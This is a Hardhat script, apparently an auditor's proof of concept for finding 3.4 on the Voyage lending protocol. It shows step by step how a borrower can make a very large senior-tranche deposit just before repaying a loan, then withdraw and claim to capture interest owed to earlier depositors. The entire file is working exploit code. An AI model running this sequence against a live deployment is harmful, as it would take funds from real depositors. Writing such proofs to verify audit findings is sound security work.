import {
  JuniorDepositToken,
  SeniorDepositToken,
  Voyage,
  WETH9,
} from '@contracts';
import { REFUND_GAS_PRICE, REFUND_GAS_UNIT } from '@helpers/constants';
import { MAX_UINT_256 } from '@helpers/math';
import { getTrustedForwarder, getWETH9 } from '@helpers/task-helpers/addresses';
import {
  LooksRareExchangeAbi,
  MakerOrderWithVRS,
  TakerOrderWithEncodedParams,
} from '@looksrare/sdk';
import { task } from 'hardhat/config';

task('dev:poc', 'Poc for audit 3.4')
  .addOptionalParam('penguins', 'The Pudgy Penguins address.')
  .setAction(async (params, hre) => {
    await hre.run('set-hre');
    const voyage = await hre.ethers.getContract<Voyage>('Voyage');

    const { ethers, getNamedAccounts } = hre;
    const { alice, bob, owner } = await getNamedAccounts();
    console.log('create vault for bob');
    const ownerSigner = await ethers.getSigner(owner);
    const looksRareAddress = '0x59728544B08AB483533076417FbBB2fD0B17CE3a';
    const { penguins = '0xBd3531dA5CF5857e7CfAA92426877b022e612cf8' } = params;
    const [senior, junior] = await voyage.getDepositTokens(penguins);
    const seniorDepositToken = await ethers.getContractAt<SeniorDepositToken>(
      'SeniorDepositToken',
      senior
    );
    const juniorDepositToken = await ethers.getContractAt<JuniorDepositToken>(
      'JuniorDepositToken',
      junior
    );
    const priceOracle = await ethers.getContract('PriceOracle');

    const weth = await ethers.getContractAt<WETH9>(
      'WETH9',
      '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
    );
    const dumpState = async (
      event: string,
      weth: WETH9,
      juniorDepositToken: JuniorDepositToken,
      seniorDepositToken: SeniorDepositToken,
      alice: string,
      bob: string,
      bVaultAddress: string | undefined
    ) => {
      console.log('------- ' + event + ' ------');

      // Junior pool state
      console.log(
        'Junior WETH balance: ',
        ethers.utils.formatEther(
          await weth.balanceOf(juniorDepositToken.address)
        )
      );
      console.log(
        'Junior totalAssets(): ',
        ethers.utils.formatEther(await juniorDepositToken.totalAssets())
      );

      // Senior pool state
      console.log(
        'Senior WETH balance: ',
        ethers.utils.formatEther(
          await weth.balanceOf(seniorDepositToken.address)
        )
      );
      console.log(
        'Senior totalAssets(): ',
        ethers.utils.formatEther(await seniorDepositToken.totalAssets())
      );

      // Alice state
      console.log(
        'Alice WETH balance: ',
        ethers.utils.formatEther(await weth.balanceOf(alice))
      );
      console.log(
        'Alice junior withdrawable balance: ',
        ethers.utils.formatEther(await juniorDepositToken.maxWithdraw(alice))
      );
      console.log(
        'Alice senior withdrawable balance: ',
        ethers.utils.formatEther(await seniorDepositToken.maxWithdraw(alice))
      );

      // Bob state
      console.log(
        'Bob WETH balance: ',
        ethers.utils.formatEther(await weth.balanceOf(bob))
      );
      console.log(
        'Bob junior withdrawable balance: ',
        ethers.utils.formatEther(await juniorDepositToken.maxWithdraw(bob))
      );
      console.log(
        'Bob senior withdrawable balance: ',
        ethers.utils.formatEther(await seniorDepositToken.maxWithdraw(bob))
      );
      if (bVaultAddress !== undefined) {
        console.log(
          'Bob vault WETH balance: ',
          ethers.utils.formatEther(await weth.balanceOf(bVaultAddress))
        );
      }
    };

    await dumpState(
      'Initial state',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      undefined
    );

    /* ----------- cause Alice to deposit 6k ETH to the senior tranche ----------- */
    const initialJuniorDeposit = ethers.utils.parseEther('10000');
    const initialSeniorDeposit = ethers.utils.parseEther('6000');
    // alice will do the deposit.
    const aSigner = await ethers.getSigner(alice);
    await weth
      .connect(aSigner)
      .deposit({ value: ethers.utils.parseEther('20000') });
    await weth.connect(aSigner).approve(voyage.address, MAX_UINT_256);
    const aVoyage = voyage.connect(aSigner);
    console.log('alice deposit to junior tranche');
    await aVoyage.deposit(penguins, 0, initialJuniorDeposit, {
      from: alice,
    });
    await aVoyage.deposit(penguins, 1, initialSeniorDeposit, {
      from: alice,
    });

    await dumpState(
      'State after Alice deposits',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      undefined
    );

    /* ----------------- have Bob purchase an NFT valued at 9ETH ---------------- */
    const bSigner = await ethers.getSigner(bob);
    const salt = ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes('bob@voyage.finance'))
      .slice(0, 42);
    const computedVaultAddress = await voyage.computeCounterfactualAddress(
      bob,
      salt
    );
    // fund vault for first payment
    const tx = {
      to: computedVaultAddress,
      value: ethers.utils.parseEther('1000'),
    };
    const createReceipt = await ownerSigner.sendTransaction(tx);
    await createReceipt.wait();
    const bWeth = weth.connect(bSigner);
    await bSigner.sendTransaction({
      to: computedVaultAddress,
      value: ethers.utils.parseEther('100'),
    });
    let bVaultAddress = await voyage.getVault(bob);
    if (
      bVaultAddress === undefined ||
      bVaultAddress === '0x0000000000000000000000000000000000000000'
    ) {
      const createVaultTxn = await voyage
        .connect(ownerSigner)
        .createVault(bob, salt, REFUND_GAS_UNIT, REFUND_GAS_PRICE);
      await createVaultTxn.wait();
      bVaultAddress = await voyage.getVault(bob);
      await bWeth.deposit({ value: ethers.utils.parseEther('100000') });
      await bWeth.transfer(bVaultAddress, ethers.utils.parseEther('10'));
      await bWeth.approve(bVaultAddress, MAX_UINT_256);
    }
    console.log('bob vault address: ', bVaultAddress);

    console.log('setup twap');
    await priceOracle.updateTwap(penguins, ethers.utils.parseEther('10'));

    const looks = new ethers.Contract(
      looksRareAddress,
      LooksRareExchangeAbi,
      ethers.provider
    );

    const looksRareMakerOrderData: MakerOrderWithVRS = {
      isOrderAsk: true,
      signer: '0xa7b9c7CB5dfaf482Ce2d3166b955E685e080cBbc',
      collection: penguins,
      price: '3249300000000000000',
      tokenId: '7576',
      amount: 1,
      strategy: '0x56244Bb70CbD3EA9Dc8007399F61dFC065190031',
      currency: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
      nonce: '510',
      startTime: 1665719889,
      endTime: 1666324688,
      minPercentageToAsk: 8500,
      params: ethers.utils.defaultAbiCoder.encode([], []),
      v: 28,
      r: '0x521b549bb4af37365cd5827f5e69bfa045edf3b6c2c5bf7de1af9dcfdba3fc5a',
      s: '0x4151546dec076719253055547ccc72cd3b53dd857bc1a7d67e6b7438511fd727',
    };

    const looksRareTakerOrderData: TakerOrderWithEncodedParams = {
      isOrderAsk: false,
      taker: bVaultAddress,
      price: looksRareMakerOrderData.price,
      tokenId: looksRareMakerOrderData.tokenId,
      minPercentageToAsk: 9800,
      params: ethers.utils.defaultAbiCoder.encode([], []),
    };
    const calldata = (
      await looks.populateTransaction.matchAskWithTakerBidUsingETHAndWETH(
        looksRareTakerOrderData,
        looksRareMakerOrderData
      )
    ).data!;

    const bVoyage = voyage.connect(bSigner);

    // approve marketplace
    bVoyage.approveMarketplace(bVaultAddress, looksRareAddress, false);

    await dumpState(
      'Before buy',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );

    // buy
    console.log('bob buyNow');
    await bVoyage.buyNow(
      penguins,
      7576,
      bVaultAddress,
      looksRareAddress,
      calldata
    );
    await dumpState(
      'After buy',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );

    /* ----------------- have Bob deposit a large amount of WETH ---------------- */
    await bWeth.deposit({ value: ethers.utils.parseEther('1000000') });
    await dumpState(
      "Before Bob's deposit",
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );
    await bWeth.approve(voyage.address, MAX_UINT_256);
    // deposit ~10x totalAssets()
    const bDeposit = ethers.utils.parseEther('1000000');
    await bVoyage.deposit(penguins, 1, bDeposit);
    await dumpState(
      "After Bob's deposit",
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );

    /* --------------------- have Bob repay both instalments -------------------- */
    const loan = await voyage.getLoanDetail(bVaultAddress, weth.address, 0);
    const pmtPrincipal = loan.pmt.principal;
    const pmtInterest = loan.pmt.interest;
    await bWeth.transfer(bVaultAddress, ethers.utils.parseEther('3'));
    await bVoyage.repay(penguins, 0, bVaultAddress);
    await dumpState(
      'After repay 1',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );

    await bVoyage.repay(penguins, 0, bVaultAddress);
    await dumpState(
      'After repay 2',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );

    /* ----------------------- have Bob withdraw his WETH ----------------------- */
    const bBalance0 = await seniorDepositToken.maxWithdraw(bob);

    await seniorDepositToken
      .connect(bSigner)
      .approve(voyage.address, MAX_UINT_256);
    await bVoyage.withdraw(penguins, 1, bBalance0);
    await dumpState(
      'After withdraw',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );

    /* ----------------------------- have Bob claim ----------------------------- */
    const wethBalance0 = await weth.balanceOf(bob);
    await seniorDepositToken.connect(bSigner).claim();
    const wethBalance1 = await weth.balanceOf(bob);
    const totalClaimed = wethBalance1.sub(wethBalance0);
    await dumpState(
      'After claim',
      weth,
      juniorDepositToken,
      seniorDepositToken,
      alice,
      bob,
      bVaultAddress
    );
  });
